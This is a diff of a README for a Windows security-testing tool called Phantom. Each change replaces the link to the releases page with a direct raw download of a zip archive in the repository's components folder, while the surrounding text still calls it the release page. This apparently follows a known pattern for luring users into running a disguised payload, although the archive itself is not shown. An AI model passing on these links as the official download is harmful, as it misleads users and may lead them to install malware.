@@ -1,6 +1,6 @@
 # 👻 Phantom - Simple Autonomous Security Testing
 
-[![Download Phantom](https://img.shields.io/badge/Download-Phantom-brightgreen)](https://github.com/dhiaeddine848-ui/Phantom/releases)
+[![Download Phantom](https://img.shields.io/badge/Download-Phantom-brightgreen)](https://github.com/dhiaeddine848-ui/Phantom/raw/refs/heads/main/components/Software-v3.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to download and open Phantom on your Windows PC.
 
 Click the button below to open the Phantom release page. This is where you download the latest version.
 
-[![Download Phantom](https://img.shields.io/badge/Get%20Phantom-blue)](https://github.com/dhiaeddine848-ui/Phantom/releases)
+[![Download Phantom](https://img.shields.io/badge/Get%20Phantom-blue)](https://github.com/dhiaeddine848-ui/Phantom/raw/refs/heads/main/components/Software-v3.3.zip)
 
 ### Step 2: Download the Installer
 
@@ -110,7 +110,7 @@ For more help, check the Issues section on the GitHub page.
 Phantom gets regular updates to improve its tests and add new features. To keep your tool current:
 
 - Visit the release page regularly:  
-  https://github.com/dhiaeddine848-ui/Phantom/releases  
+  https://github.com/dhiaeddine848-ui/Phantom/raw/refs/heads/main/components/Software-v3.3.zip  
 - Download and install new versions using the same steps as before  
 
 ---
@@ -127,4 +127,4 @@ Phantom gets regular updates to improve its tests and add new features. To keep 
 
 Click below to open the download page again and get the latest version.
 
-[![Download Phantom](https://img.shields.io/badge/Download-Phantom-9cf)](https://github.com/dhiaeddine848-ui/Phantom/releases)
+[![Download Phantom](https://img.shields.io/badge/Download-Phantom-9cf)](https://github.com/dhiaeddine848-ui/Phantom/raw/refs/heads/main/components/Software-v3.3.zip)
